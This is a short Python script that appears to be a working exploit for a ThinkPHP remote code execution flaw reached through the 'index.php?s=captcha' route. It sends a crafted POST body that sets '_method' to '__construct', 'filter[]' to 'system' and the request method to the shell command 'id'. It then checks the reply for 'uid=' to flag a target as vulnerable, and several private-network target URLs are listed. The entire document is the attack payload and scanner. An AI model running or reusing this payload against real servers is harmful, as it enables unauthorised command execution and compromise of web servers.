import requests,re

url="http://192.168.0.68:8001/index.php?s=captcha"
url="https://192.168.0.96/index.php?s=captcha"
url="http://192.168.0.68:8003/index.php?s=captcha"
url="http://192.168.0.68:8002/index.php?s=captcha"
url="https://192.168.0.77/index.php?s=captcha"
url="https://192.168.0.97/index.php?s=captcha"


headers = {'Content-Type': 'application/x-www-form-urlencoded'}

data={"_method":"__construct","filter[]":"system","method":"get","server[REQUEST_METHOD]":"id"}

aa=requests.post(url,headers=headers,data=data,verify=False).text

if "uid=" in str(aa):
	print ("yes",url)
else:
	print ("no")
